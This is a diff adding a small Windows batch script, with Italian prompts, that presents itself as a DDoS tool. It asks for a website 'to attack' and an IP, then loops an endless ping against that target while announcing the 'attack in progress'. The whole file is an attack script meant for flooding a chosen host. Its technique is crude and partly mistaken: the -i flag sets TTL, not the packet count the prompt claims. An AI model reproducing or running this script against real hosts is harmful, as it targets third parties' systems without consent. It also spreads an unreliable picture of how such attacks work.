@@ -1,0 +1,59 @@
+@echo off
+
+mode 67,16
+
+title DDOS
+
+color 5
+
+cls
+
+echo.
+
+echo  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 
+
+echo Programma per dossare :) :) :) :/ :/
+
+echo  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+echo.
+
+set /p x=Nome del sito da attaccare:
+
+echo.
+
+echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+ping %x%
+
+echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+@ping.exe 127.0.0.1 -n 5 -w 1500 > nul
+
+goto Next
+
+:Next
+
+echo.
+
+echo.
+
+echo.
+
+set /p m=            IP host:
+
+echo.
+
+set /p n=Numero pacchetti:1500
+
+echo.
+
+:DDOS
+
+color 0c
+
+echo Attacco %m% in corso
+
+ping %m% -i %n% -t >nul
+
+goto DDOS
